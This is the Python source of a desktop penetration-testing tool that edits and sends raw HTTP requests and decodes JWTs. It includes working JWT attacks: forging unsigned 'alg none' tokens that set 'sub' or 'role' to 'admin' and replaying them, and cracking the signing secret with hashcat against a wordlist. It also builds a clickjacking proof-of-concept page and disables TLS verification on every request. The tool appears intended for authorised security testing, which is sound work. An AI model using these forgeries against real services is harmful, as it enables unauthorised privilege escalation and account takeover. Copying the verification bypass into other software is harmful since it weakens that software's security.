import tkinter as tk
from tkinter import ttk, messagebox, simpledialog
import jwt
import json
import requests
import re
import subprocess
import os
from urllib.parse import urlparse, parse_qs
import base64

class HTTPRequestTool:
    def __init__(self, root):
        self.root = root
        self.root.title("HTTP Request Tool with JWT Decoder")
        
        # Set minimum window size
        self.root.minsize(1200, 800)
        
        # Create main paned window
        self.paned = ttk.PanedWindow(root, orient=tk.HORIZONTAL)
        self.paned.pack(fill=tk.BOTH, expand=True)
        
        # Left frame for request
        self.request_frame = ttk.Frame(self.paned)
        self.paned.add(self.request_frame, weight=1)
        
        # Right frame for JWT and response
        self.response_frame = ttk.Frame(self.paned)
        self.paned.add(self.response_frame, weight=1)
        
        # Create vertical paned window for JWT and response
        self.vertical_paned = ttk.PanedWindow(self.response_frame, orient=tk.VERTICAL)
        self.vertical_paned.pack(fill=tk.BOTH, expand=True)
        
        # JWT section
        self.jwt_section = ttk.Frame(self.vertical_paned)
        self.vertical_paned.add(self.jwt_section, weight=1)
        
        # JWT header with minimize checkbox
        jwt_header = ttk.Frame(self.jwt_section)
        jwt_header.pack(fill=tk.X, pady=5)
        self.minimize_jwt = tk.BooleanVar(value=False)
        self.minimize_check = ttk.Checkbutton(jwt_header, text="Minimize", variable=self.minimize_jwt, command=self.toggle_jwt_section)
        self.minimize_check.pack(side=tk.RIGHT, padx=5)
        
        # Add edit button and secret key frame
        edit_frame = ttk.Frame(self.jwt_section)
        edit_frame.pack(fill=tk.X, pady=5)
        ttk.Label(edit_frame, text="JWT Decoded").pack(side=tk.LEFT, pady=5)
        
        # Add secret key frame
        secret_frame = ttk.Frame(edit_frame)
        secret_frame.pack(side=tk.RIGHT, padx=5)
        
        self.use_secret = tk.BooleanVar(value=False)
        self.secret_check = ttk.Checkbutton(secret_frame, text="Use Secret Key", variable=self.use_secret)
        self.secret_check.pack(side=tk.LEFT, padx=5)
        
        self.secret_entry = ttk.Entry(secret_frame, width=20)
        self.secret_entry.pack(side=tk.LEFT, padx=5)
        
        self.edit_button = ttk.Button(edit_frame, text="Edit JWT", command=self.edit_jwt)
        self.edit_button.pack(side=tk.RIGHT, padx=5)
        
        self.jwt_text = tk.Text(self.jwt_section, width=80, height=20)
        self.jwt_text.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)
        
        # Response section
        self.response_section = ttk.Frame(self.vertical_paned)
        self.vertical_paned.add(self.response_section, weight=1)
        
        # Response header
        response_header = ttk.Frame(self.response_section)
        response_header.pack(fill=tk.X, pady=5)
        ttk.Label(response_header, text="Response").pack(side=tk.LEFT, pady=5)
        copy_button = ttk.Button(response_header, text="📋 Copy", command=self.copy_response)
        copy_button.pack(side=tk.RIGHT, padx=5)
        
        self.response_text = tk.Text(self.response_section, width=80, height=20)
        self.response_text.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)
        
        # Request components
        ttk.Label(self.request_frame, text="HTTP Request").pack(pady=5)
        self.request_text = tk.Text(self.request_frame, width=80, height=40)
        self.request_text.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)
        
        # Bind text changes to JWT detection
        self.request_text.bind('<<Modified>>', self.on_text_change)
        
        # Button frame
        button_frame = ttk.Frame(self.request_frame)
        button_frame.pack(pady=5, fill=tk.X)
        
        # Send button
        self.send_button = ttk.Button(button_frame, text="Send Request", command=self.process_request)
        self.send_button.pack(side=tk.LEFT, padx=5)
        
        # JWT Attacks button
        self.jwt_attacks_button = ttk.Button(button_frame, text="JWT Attacks", command=self.show_jwt_attacks_menu)
        self.jwt_attacks_button.pack(side=tk.LEFT, padx=5)
        
        # Clickjack button
        self.clickjack_button = ttk.Button(button_frame, text="Generate Clickjack", command=self.generate_clickjack)
        self.clickjack_button.pack(side=tk.LEFT, padx=5)
        
        # TestSSL button
        self.testssl_button = ttk.Button(button_frame, text="Run TestSSL", command=self.run_testssl)
        self.testssl_button.pack(side=tk.LEFT, padx=5)

    def is_jwt(self, token):
        # Split the token into parts
        parts = token.split('.')
        
        # We only care about header and body
        if len(parts) < 2:
            return False
            
        try:
            # Check if header and body are valid base64
            for part in parts[:2]:  # Only check header and body
                if part:  # Skip empty parts
                    # Add padding if needed
                    padding = 4 - (len(part) % 4)
                    if padding != 4:
                        part += '=' * padding
                    decoded = base64.b64decode(part)
                    # Try to parse as JSON to verify structure
                    json.loads(decoded)
            return True
        except:
            return False

    def decode_jwt(self, token):
        try:
            # Split the token into parts
            parts = token.split('.')
            
            # We only care about header and body
            if len(parts) < 2:
                return "Invalid JWT format"
            
            # Decode header and body
            decoded_parts = []
            for part in parts[:2]:  # Only process header and body
                if part:
                    # Add padding if needed
                    padding = 4 - (len(part) % 4)
                    if padding != 4:
                        part += '=' * padding
                    decoded = base64.b64decode(part)
                    try:
                        # Try to parse as JSON
                        decoded_parts.append(json.loads(decoded))
                    except:
                        # If not JSON, just use the decoded string
                        decoded_parts.append(decoded.decode('utf-8'))
            
            # Format the output
            output = []
            if len(decoded_parts) >= 1:
                output.append(f"Header:\n{json.dumps(decoded_parts[0], indent=2)}")
            if len(decoded_parts) >= 2:
                output.append(f"\nPayload:\n{json.dumps(decoded_parts[1], indent=2)}")
                
            return '\n'.join(output)
        except Exception as e:
            return f"Error decoding JWT: {str(e)}"

    def encode_jwt(self, header, payload, signature=None):
        try:
            # Encode header and payload
            encoded_header = base64.urlsafe_b64encode(
                json.dumps(header).encode('utf-8')
            ).decode('utf-8').rstrip('=')
            
            encoded_payload = base64.urlsafe_b64encode(
                json.dumps(payload).encode('utf-8')
            ).decode('utf-8').rstrip('=')
            
            # Construct the token
            token_parts = [encoded_header, encoded_payload]
            if signature:
                token_parts.append(signature)
            
            return '.'.join(token_parts)
        except Exception as e:
            return f"Error encoding JWT: {str(e)}"

    def find_jwt(self, request_text):
        # Split request into words and check each for JWT pattern
        tokens = []
        seen_tokens = set()  # Track seen tokens to avoid duplicates
        
        # Find all potential JWT patterns in the text
        # This regex looks for base64 strings separated by dots, allowing for more flexible patterns
        jwt_pattern = r'(?:Bearer\s+)?([A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+(?:\.[A-Za-z0-9-_=]+)?)'
        
        # Look for JWTs in headers
        for line in request_text.split('\n'):
            # Check for Authorization header
            if 'Authorization:' in line:
                matches = re.findall(jwt_pattern, line)
                for token in matches:
                    if token not in seen_tokens and self.is_jwt(token):
                        tokens.append(token)
                        seen_tokens.add(token)
            
            # Check for Cookie header
            if 'Cookie:' in line:
                # Look for session cookies that might contain JWTs
                cookie_matches = re.findall(r'session=([^;,\s]+)', line)
                for token in cookie_matches:
                    if token not in seen_tokens and self.is_jwt(token):
                        tokens.append(token)
                        seen_tokens.add(token)
            
            # Check for other potential JWT-containing headers
            if ':' in line:
                header_value = line.split(':', 1)[1].strip()
                matches = re.findall(jwt_pattern, header_value)
                for token in matches:
                    if token not in seen_tokens and self.is_jwt(token):
                        tokens.append(token)
                        seen_tokens.add(token)
        
        # Also check the entire text for any JWTs we might have missed
        all_matches = re.findall(jwt_pattern, request_text)
        for token in all_matches:
            if token not in seen_tokens and self.is_jwt(token):
                tokens.append(token)
                seen_tokens.add(token)
        
        # Return all found JWTs
        return tokens

    def on_text_change(self, event=None):
        # Reset the modified flag
        self.request_text.edit_modified(False)
        
        # Get current text and find/decode JWTs
        request_text = self.request_text.get("1.0", tk.END).strip()
        jwt_tokens = self.find_jwt(request_text)
        
        self.jwt_text.delete("1.0", tk.END)
        if jwt_tokens:
            decoded_output = ""
            for i, token in enumerate(jwt_tokens, 1):
                decoded_output += f"JWT #{i}:\n{self.decode_jwt(token)}\n\n"
            self.jwt_text.insert("1.0", decoded_output)
        else:
            self.jwt_text.insert("1.0", "No JWT tokens found in request")

    def copy_response(self):
        response_text = self.response_text.get("1.0", tk.END).strip()
        self.root.clipboard_clear()
        self.root.clipboard_append(response_text)
        messagebox.showinfo("Success", "Content copied to clipboard!")

    def generate_clickjack(self):
        url = simpledialog.askstring("Generate Clickjack", "Enter target URL:")
        if url:
            clickjack_html = f"""<html>
   <head>
      <title>Aon Clickjacking Example PoC</title>
      <style>
         body {{
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
         }}
         .container {{
            max-width: 1200px;
            margin: 0 auto;
         }}
         h1 {{
            color: #333;
            margin-bottom: 20px;
         }}
         .iframe-container {{
            position: relative;
            width: 100%;
            height: 80vh;
         }}
         iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.5;
            border: 2px solid #333;
         }}
      </style>
   </head>
   <body>
      <div class="container">
         <h1>Aon Clickjacking PoC</h1>
         <div class="iframe-container">
            <iframe src="{url}"></iframe>
         </div>
      </div>
   </body>
</html>"""
            self.response_text.delete("1.0", tk.END)
            self.response_text.insert("1.0", clickjack_html)

    def process_request(self):
        request_text = self.request_text.get("1.0", tk.END).strip()
        
        try:
            # Parse the raw HTTP request
            request_lines = request_text.split('\n')
            if not request_lines:
                raise ValueError("Empty request")

            # Parse first line (method, path, version)
            method, path, *_ = request_lines[0].split()
            
            # Parse headers
            headers = {}
            current_line = 1
            while current_line < len(request_lines) and request_lines[current_line].strip():
                header_line = request_lines[current_line].strip()
                key, value = header_line.split(':', 1)
                headers[key.strip()] = value.strip()
                current_line += 1
            
            # Get body if exists (after blank line)
            body = None
            if current_line < len(request_lines):
                body = '\n'.join(request_lines[current_line + 1:]).strip()
            
            # Parse URL and enforce HTTPS
            if not path.startswith('http'):
                # If host header exists, use it to construct full URL
                host = headers.get('Host', '')
                if host:
                    # Always use HTTPS
                    path = f"https://{host}{path}"
                else:
                    raise ValueError("No host specified in headers and path is not absolute URL")
            else:
                # If URL starts with http://, change it to https://
                if path.startswith('http://'):
                    path = path.replace('http://', 'https://', 1)
            
            # Send the request
            response = requests.request(
                method=method,
                url=path,
                headers=headers,
                data=body,
                verify=False  # Skip SSL verification for testing
            )
            
            # Format response
            response_text = f"HTTP/{response.raw.version / 10.0} {response.status_code} {response.reason}\n"
            for key, value in response.headers.items():
                response_text += f"{key}: {value}\n"
            response_text += f"\n{response.text}"
            
            self.response_text.delete("1.0", tk.END)
            self.response_text.insert("1.0", response_text)
            
        except Exception as e:
            self.response_text.delete("1.0", tk.END)
            self.response_text.insert("1.0", f"Error processing request: {str(e)}")

    def run_testssl(self):
        domain = simpledialog.askstring("TestSSL", "Enter domain to test:")
        if domain:
            try:
                # Store current directory
                current_dir = os.getcwd()
                
                # Change to testssl directory
                os.chdir('testssl')
                
                # Make sure testssl.sh is executable
                os.chmod('testssl.sh', 0o755)
                
                # Run testssl.sh with HTML output using system OpenSSL
                result = subprocess.run(
                    ['./testssl.sh', '--html', domain],
                    capture_output=True,
                    text=True
                )
                
                # Change back to original directory
                os.chdir(current_dir)
                
                # Display the output in the response text area
                self.response_text.delete("1.0", tk.END)
                self.response_text.insert("1.0", f"TestSSL Results for {domain}:\n\n{result.stdout}")
                
                if result.stderr:
                    self.response_text.insert(tk.END, f"\n\nErrors:\n{result.stderr}")
                
                messagebox.showinfo("TestSSL", f"TestSSL scan completed for {domain}")
            except Exception as e:
                # Make sure we change back to original directory even if there's an error
                os.chdir(current_dir)
                messagebox.showerror("Error", f"Failed to run TestSSL: {str(e)}")

    def toggle_jwt_section(self):
        if self.minimize_jwt.get():
            self.jwt_text.pack_forget()
        else:
            self.jwt_text.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)

    def show_jwt_attacks_menu(self):
        # Create a new window for JWT attacks
        attack_window = tk.Toplevel(self.root)
        attack_window.title("JWT Attacks")
        attack_window.geometry("400x300")
        
        # Create a frame for attack options
        attack_frame = ttk.Frame(attack_window)
        attack_frame.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
        
        # Add attack options
        self.unverified_sig_var = tk.BooleanVar()
        ttk.Checkbutton(attack_frame, text="Unverified Signature Attack", variable=self.unverified_sig_var).pack(anchor=tk.W, pady=5)
        
        self.none_sig_var = tk.BooleanVar()
        ttk.Checkbutton(attack_frame, text="None Signature Attack", variable=self.none_sig_var).pack(anchor=tk.W, pady=5)
        
        self.brute_force_var = tk.BooleanVar()
        ttk.Checkbutton(attack_frame, text="Brute Force Secret Key", variable=self.brute_force_var).pack(anchor=tk.W, pady=5)
        
        # Add button to manage secrets list
        ttk.Button(attack_frame, text="Manage Secrets List", command=self.manage_secrets_list).pack(pady=5)
        
        # Add run button
        ttk.Button(attack_frame, text="Run Selected Attacks", command=lambda: self.run_jwt_attacks(attack_window)).pack(pady=10)

    def manage_secrets_list(self):
        # Create window for managing secrets
        secrets_window = tk.Toplevel(self.root)
        secrets_window.title("Manage JWT Secrets")
        secrets_window.geometry("600x400")
        
        # Create main frame
        main_frame = ttk.Frame(secrets_window)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create text area for secrets
        secrets_frame = ttk.LabelFrame(main_frame, text="JWT Secrets List")
        secrets_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        secrets_text = tk.Text(secrets_frame, wrap=tk.WORD)
        secrets_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Load existing secrets if file exists
        secrets_path = 'jwt_secrets/jwt.secrets.list'
        if os.path.exists(secrets_path):
            with open(secrets_path, 'r') as f:
                secrets_text.insert("1.0", f.read())
        else:
            messagebox.showerror("Error", f"Secrets file not found at {secrets_path}")
            secrets_window.destroy()
            return
        
        # Add buttons frame
        buttons_frame = ttk.Frame(main_frame)
        buttons_frame.pack(fill=tk.X, pady=5)
        
        def save_secrets():
            try:
                with open(secrets_path, 'w') as f:
                    f.write(secrets_text.get("1.0", tk.END).strip())
                messagebox.showinfo("Success", "Secrets list saved successfully")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save secrets list: {str(e)}")
        
        ttk.Button(buttons_frame, text="Save Changes", command=save_secrets).pack(side=tk.LEFT, padx=5)

    def run_jwt_attacks(self, attack_window):
        if self.unverified_sig_var.get():
            self.perform_unverified_signature_attack()
        if self.none_sig_var.get():
            self.perform_none_signature_attack()
        if self.brute_force_var.get():
            self.perform_brute_force_attack()
        attack_window.destroy()

    def perform_unverified_signature_attack(self):
        # Get the current request text
        request_text = self.request_text.get("1.0", tk.END).strip()
        
        # Find JWT tokens in the request
        jwt_tokens = self.find_jwt(request_text)
        if not jwt_tokens:
            messagebox.showerror("Error", "No JWT tokens found in request")
            return
        
        # Get the first JWT token
        original_token = jwt_tokens[0]
        
        try:
            # Decode the JWT without verification
            header = jwt.get_unverified_header(original_token)
            payload = jwt.decode(original_token, options={"verify_signature": False})
            
            # Modify a value in the payload (e.g., change 'sub' to 'admin' if it exists)
            if 'sub' in payload:
                payload['sub'] = 'admin'
            elif 'role' in payload:
                payload['role'] = 'admin'
            else:
                # If no obvious fields to modify, add a new one
                payload['modified'] = 'true'
            
            # Create a new token with the modified payload
            # We don't need to sign it since we're testing unverified signature
            modified_token = jwt.encode(payload, "", algorithm="none")
            
            # Replace the original token in the request
            modified_request = request_text.replace(original_token, modified_token)
            
            # Send the modified request
            self.request_text.delete("1.0", tk.END)
            self.request_text.insert("1.0", modified_request)
            self.process_request()
            
            # Get the response status code from the response text
            response_text = self.response_text.get("1.0", tk.END)
            status_line = response_text.split('\n')[0]
            try:
                status_code = int(status_line.split()[1])
            except (IndexError, ValueError):
                status_code = 0
            
            # Check if the status code indicates failure (400 or 500 series)
            if status_code >= 400:
                messagebox.showinfo("Attack Result", "Unverified Signature Attack: ❌ FAILED")
            else:
                messagebox.showinfo("Attack Result", "Unverified Signature Attack: ✅ SUCCESS")
                
        except Exception as e:
            messagebox.showerror("Error", f"Failed to perform attack: {str(e)}")

    def perform_none_signature_attack(self):
        # Get the current request text
        request_text = self.request_text.get("1.0", tk.END).strip()
        
        # Find JWT tokens in the request
        jwt_tokens = self.find_jwt(request_text)
        if not jwt_tokens:
            messagebox.showerror("Error", "No JWT tokens found in request")
            return
        
        # Get the first JWT token
        original_token = jwt_tokens[0]
        
        try:
            # Decode the JWT without verification
            header = jwt.get_unverified_header(original_token)
            payload = jwt.decode(original_token, options={"verify_signature": False})
            
            # Try different variations of "none"
            none_variations = ["none", "None", "NONE", "nOnE"]
            success = False
            successful_variation = None
            
            for variation in none_variations:
                # Create a new header with the current variation
                new_header = header.copy()
                new_header["alg"] = variation
                
                # Create a new token with the modified header
                modified_token = jwt.encode(payload, "", algorithm="none")
                
                # Replace the original token in the request
                modified_request = request_text.replace(original_token, modified_token)
                
                # Send the modified request
                self.request_text.delete("1.0", tk.END)
                self.request_text.insert("1.0", modified_request)
                self.process_request()
                
                # Get the response status code from the response text
                response_text = self.response_text.get("1.0", tk.END)
                status_line = response_text.split('\n')[0]
                try:
                    status_code = int(status_line.split()[1])
                except (IndexError, ValueError):
                    status_code = 0
                
                # If we get a success response, keep this variation
                if status_code < 400:
                    success = True
                    successful_variation = variation
                    break
            
            if success:
                messagebox.showinfo("Attack Result", f"None Signature Attack: ✅ SUCCESS\nSuccessful variation: {successful_variation}")
            else:
                messagebox.showinfo("Attack Result", "None Signature Attack: ❌ FAILED\nAll variations failed")
                
        except Exception as e:
            messagebox.showerror("Error", f"Failed to perform attack: {str(e)}")

    def perform_brute_force_attack(self):
        # Get the current request text
        request_text = self.request_text.get("1.0", tk.END).strip()
        
        # Find JWT tokens in the request
        jwt_tokens = self.find_jwt(request_text)
        if not jwt_tokens:
            messagebox.showerror("Error", "No JWT tokens found in request")
            return
        
        # Get the first JWT token
        jwt_token = jwt_tokens[0]
        
        try:
            # Create a temporary file for the JWT
            with open('temp_jwt.txt', 'w') as f:
                f.write(jwt_token)
            
            # Check if hashcat is installed
            try:
                subprocess.run(['hashcat', '--version'], capture_output=True, check=True)
            except (subprocess.SubprocessError, FileNotFoundError):
                messagebox.showerror("Error", "hashcat is not installed. Please install hashcat to use this feature.")
                return
            
            # Check if jwt.secrets.list exists in jwt_secrets folder
            secrets_path = 'jwt_secrets/jwt.secrets.list'
            if not os.path.exists(secrets_path):
                messagebox.showerror("Error", f"Secrets file not found at {secrets_path}")
                return
            
            # Create results window
            results_window = tk.Toplevel(self.root)
            results_window.title("Brute Force Attack Results")
            results_window.geometry("800x600")
            
            # Create text area for output
            output_frame = ttk.Frame(results_window)
            output_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            
            output_label = ttk.Label(output_frame, text="Hashcat Output:")
            output_label.pack(anchor=tk.W, pady=5)
            
            output_text = tk.Text(output_frame, wrap=tk.WORD)
            output_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            
            # Add progress bar
            progress_frame = ttk.Frame(results_window)
            progress_frame.pack(fill=tk.X, padx=5, pady=5)
            
            progress_label = ttk.Label(progress_frame, text="Running hashcat...")
            progress_label.pack(side=tk.LEFT, padx=5)
            
            progress = ttk.Progressbar(progress_frame, mode='indeterminate')
            progress.pack(fill=tk.X, expand=True, padx=5)
            progress.start()
            
            def run_hashcat():
                try:
                    # Run hashcat with proper formatting and wordlist
                    result = subprocess.run(
                        ['hashcat', '-a', '0', '-m', '16500', 'temp_jwt.txt', secrets_path],
                        capture_output=True,
                        text=True
                    )
                    
                    # Update UI in main thread
                    results_window.after(0, lambda: update_output(result))
                except Exception as e:
                    results_window.after(0, lambda: show_error(str(e)))
            
            def update_output(result):
                progress.stop()
                progress.pack_forget()
                progress_label.config(text="Hashcat completed")
                
                # Display the full output
                output_text.insert("1.0", result.stdout)
                if result.stderr:
                    output_text.insert(tk.END, f"\nErrors:\n{result.stderr}")
                
                # Parse the output to find the secret
                if result.stdout:
                    # Look for the JWT in the output
                    for line in result.stdout.split('\n'):
                        if jwt_token in line:
                            # The secret should be after the JWT
                            parts = line.split(':')
                            if len(parts) > 1:
                                secret = parts[-1].strip()
                                messagebox.showinfo("Success", f"Found secret key: {secret}")
                                break
                    else:
                        messagebox.showinfo("Result", "No secret key found in the dictionary")
                
                # Clean up
                try:
                    os.remove('temp_jwt.txt')
                except:
                    pass
            
            def show_error(error):
                progress.stop()
                progress.pack_forget()
                progress_label.config(text="Error occurred")
                output_text.insert("1.0", f"Error: {error}")
                messagebox.showerror("Error", f"Failed to run hashcat: {error}")
            
            # Run hashcat in a separate thread
            import threading
            threading.Thread(target=run_hashcat, daemon=True).start()
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to perform attack: {str(e)}")

    def edit_jwt(self):
        # Get the current JWT content
        jwt_content = self.jwt_text.get("1.0", tk.END).strip()
        if not jwt_content or "No JWT tokens found" in jwt_content:
            messagebox.showinfo("Info", "No JWT to edit")
            return
            
        # Create edit window
        edit_window = tk.Toplevel(self.root)
        edit_window.title("Edit JWT")
        edit_window.geometry("400x500")
        
        # Parse current JWT content
        try:
            header_start = jwt_content.find("Header:") + 7
            header_end = jwt_content.find("Payload:")
            payload_start = header_end + 8
            
            header_json = json.loads(jwt_content[header_start:header_end].strip())
            payload_json = json.loads(jwt_content[payload_start:].strip())
            
            # Create a frame for each part
            header_frame = ttk.LabelFrame(edit_window, text="Header")
            header_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            header_text = tk.Text(header_frame, width=40, height=5)
            header_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            header_text.insert("1.0", json.dumps(header_json, indent=2))
            
            payload_frame = ttk.LabelFrame(edit_window, text="Payload")
            payload_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            payload_text = tk.Text(payload_frame, width=40, height=5)
            payload_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            payload_text.insert("1.0", json.dumps(payload_json, indent=2))
            
            def save_changes():
                try:
                    # Get edited content
                    new_header = json.loads(header_text.get("1.0", tk.END).strip())
                    new_payload = json.loads(payload_text.get("1.0", tk.END).strip())
                    
                    # Get the original request
                    original_request = self.request_text.get("1.0", tk.END)
                    
                    # Find the JWT token in the request
                    original_token = None
                    
                    # List of headers that might contain JWTs
                    jwt_headers = [
                        ('Authorization', 'Bearer '),
                        ('Cookie', 'session='),
                        ('Cookie', 'token='),
                        ('Cookie', 'jwt='),
                        ('X-Auth-Token', ''),
                        ('X-JWT-Token', ''),
                        ('X-Access-Token', ''),
                        ('X-Token', '')
                    ]
                    
                    # First try to find in common headers
                    for line in original_request.split('\n'):
                        for header, prefix in jwt_headers:
                            if line.startswith(f"{header}:"):
                                value = line.split(':', 1)[1].strip()
                                if prefix:
                                    if prefix in value:
                                        original_token = value.split(prefix)[1].strip()
                                        break
                                else:
                                    original_token = value.strip()
                                    break
                        if original_token:
                            break
                    
                    # If not found in headers, look for any JWT pattern in the request
                    if not original_token:
                        jwt_pattern = r'[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]*'
                        matches = re.findall(jwt_pattern, original_request)
                        if matches:
                            original_token = matches[0]
                    
                    # Create a new token
                    if self.use_secret.get():
                        secret_key = self.secret_entry.get().strip()
                        if not secret_key:
                            messagebox.showerror("Error", "Please enter a secret key")
                            return
                        
                        # Get algorithm from the original token's header
                        try:
                            original_header = jwt.get_unverified_header(original_token)
                            algorithm = original_header.get('alg', 'HS256')
                        except:
                            algorithm = 'HS256'  # Default if we can't get the original algorithm
                        
                        # Check if algorithm uses a secret key
                        if algorithm in ['HS256', 'HS384', 'HS512']:
                            new_token = jwt.encode(
                                new_payload,
                                secret_key,
                                algorithm=algorithm,
                                headers=new_header
                            )
                        else:
                            messagebox.showerror("Error", f"Algorithm {algorithm} does not use a secret key for signing.\nOnly HS256, HS384, and HS512 are supported for secret key signing.")
                            return
                    else:
                        # If not using secret key, just use the algorithm from the header
                        try:
                            original_header = jwt.get_unverified_header(original_token)
                            algorithm = original_header.get('alg', 'none')
                        except:
                            algorithm = 'none'  # Default if we can't get the original algorithm
                        
                        # For non-secret key algorithms, just use the original algorithm
                        new_token = jwt.encode(
                            new_payload,
                            "",  # Empty secret for unsigned token
                            algorithm=algorithm,
                            headers=new_header
                        )
                    
                    if original_token:
                        # Replace the token in the request
                        updated_request = original_request.replace(original_token, new_token)
                    else:
                        # If no JWT found, add it to Authorization header
                        if 'Authorization:' not in original_request:
                            # Find the first line after the request line
                            lines = original_request.split('\n')
                            if len(lines) > 1:
                                # Insert Authorization header after the first line
                                lines.insert(1, f"Authorization: Bearer {new_token}")
                                updated_request = '\n'.join(lines)
                            else:
                                # If only one line, add header after it
                                updated_request = f"{original_request}\nAuthorization: Bearer {new_token}"
                        else:
                            # Replace existing Authorization header
                            updated_request = re.sub(
                                r'Authorization:.*',
                                f'Authorization: Bearer {new_token}',
                                original_request
                            )
                    
                    # Update the request text
                    self.request_text.delete("1.0", tk.END)
                    self.request_text.insert("1.0", updated_request)
                    
                    edit_window.destroy()
                    # Trigger text change to update decoded view
                    self.on_text_change()
                except Exception as e:
                    messagebox.showerror("Error", f"Failed to save changes: {str(e)}")
            
            # Add buttons frame
            buttons_frame = ttk.Frame(edit_window)
            buttons_frame.pack(fill=tk.X, pady=10)
            
            # Make buttons more prominent
            save_button = ttk.Button(buttons_frame, text="Save Changes", command=save_changes, width=15)
            save_button.pack(side=tk.LEFT, padx=5, expand=True)
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to parse JWT: {str(e)}")
            return

def main():
    root = tk.Tk()
    app = HTTPRequestTool(root)
    root.mainloop()

if __name__ == "__main__":
    main()
